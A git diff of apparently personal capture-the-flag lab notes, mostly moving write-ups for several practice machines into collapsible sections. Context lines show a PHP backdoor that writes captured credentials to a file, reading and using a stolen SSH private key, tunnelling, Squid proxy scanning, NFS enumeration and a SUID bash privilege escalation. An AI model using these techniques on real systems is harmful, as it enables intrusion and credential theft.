@@ -40,7 +40,10 @@ nc -lvnp 9011
 [★]$ source .venv/bin/activate
 ```
 
-#### rsa_id; index.php后门 form Watcher
+#### Form Watcher
+<details>
+<summary>rsa_id; index.php后门</summary>
+
 ```
 // Backdoor 手动插入后门好酷
 	  $file = fopen("creds.txt", "a+");
@@ -60,7 +63,12 @@ zabbix@watcher:/var/lib/zabbix/.ssh$ cat id_rsa
 [★]$ chmod 600 id_rsa //-rw-------
 [★]$ ssh -i id_rsa zabbix@watcher.vl -L 8111:127.0.0.1:8111 -N //-N 不执行远程命令
 ```
-#### Web_squid代理端口 Form Bamboo
+</details>
+
+#### Form Bamboo
+<details>
+<summary>Web_squid代理端口</summary>
+
 ```
 端口工具 https://book.hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html
 Squid 的Privoxy代理工具： Squidscan -> https://gist.github.com/xct/597d48456214b15108b2817660fdee00 //扫描内部端口
@@ -99,8 +107,12 @@ bash-5.1$ ls -la /bin/bash
 bash-5.1$ /bin/bash -p
 bash-5.1# id
 ```
+</details>
 
 #### psql数据库 From Slonik
+<details>
+<summary>postgres</summary>
+
 ```
 所有端口的 TTL 值均显示为 63，这与一跳之外的 Linux 系统的预期 TTL 值相符
 showmount -e将列出NFS上可用的挂载点（份额）：
@@ -149,3 +161,6 @@ COPY 0
 [~][★]$ ssh-keygen -t ed25519 //本地生成公钥
 [~][★]$ cat /home/syareya55/.ssh/id_ed25519.pub
 ```
+</details>
+
+#### Kubernetes = K8s From Giveback
